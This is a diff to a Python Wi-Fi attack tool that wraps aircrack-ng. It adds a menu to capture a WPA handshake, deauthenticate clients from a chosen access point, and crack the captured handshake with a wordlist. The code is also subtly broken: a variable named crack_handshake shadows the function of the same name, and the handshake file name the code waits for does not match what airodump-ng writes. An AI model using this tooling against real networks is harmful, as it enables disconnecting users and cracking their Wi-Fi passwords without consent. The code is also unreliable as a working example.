@@ -7,7 +7,9 @@ from rich.text import Text
 from rich.align import Align
 from rich.panel import Panel
 
+from time import sleep
 import math
+from os import path
 from os import get_terminal_size
 import subprocess
 import re
@@ -167,7 +169,17 @@ def list_access_points_ng():
     console.print(table, justify="center")
     choice = Prompt.ask("Select an access point to attack", choices=[str(i) for i in range(1, id_num + 1)])
     
-    return bssid_list[int(choice) - 1], channel_list[int(choice) - 1], device
+    console.print("H - Capture Handshake\nD - Deauth\n C - Crack handshake", justify="center")
+    attack_type = Prompt.ask("Select an attack type", choices=["H", "D", "C"])
+
+    if attack_type == "H":
+        capture_handshake(device, bssid_list[int(choice) - 1], channel_list[int(choice) - 1])
+    
+    elif attack_type == "D":
+        deauth(device, bssid_list[int(choice) - 1])
+    
+    elif attack_type == "C":
+        crack_handshake()
 
 
 def connect_to_network():
@@ -185,21 +197,28 @@ def disconnect_from_network():
     console.print(output.stdout, justify="center")
 
 
-def capture_handshake():
-    bssid, channel, device = list_access_points_ng()
-    output = subprocess.run(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "handshake", device], capture_output=True, text=True)
-    console.print(output.stdout, justify="center")
+def capture_handshake(device, bssid, channel):
+    subprocess.run(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "handshake", device])
+    console.print("Waiting for handshake to be captured", justify="center")
+    while not path.exists("handshake.pcap"):    
+        sleep(1)
 
+    console.print("[+] Handshake captured", justify="center", style="green")
+    crack_handshake = Prompt.ask("Do you want to crack the handshake?", choices=["Y", "N"])
+    if crack_handshake == "Y":
+        crack_handshake()
+    else:
+        return
+    
 
 def crack_handshake():
     banner("Cracking handshake")
     wordlist = Prompt.ask("Please enter the path to the wordlist you want to use")
-    output = subprocess.run(["aircrack-ng", "handshake-01.cap", "-w", wordlist], capture_output=True, text=True)
+    output = subprocess.run(["aircrack-ng", "handshake.pcap", "-w", wordlist], capture_output=True, text=True)
     console.print(output.stdout, justify="center")
 
 
-def deauth():
-    bssid, device = list_access_points_ng()
+def deauth(device, bssid):
     number_of_packets = Prompt.ask("Please enter the number of packets you want to send")
 
     target = Prompt.ask("Do you want to deauth all clients or just one?", choices=["All", "One"])
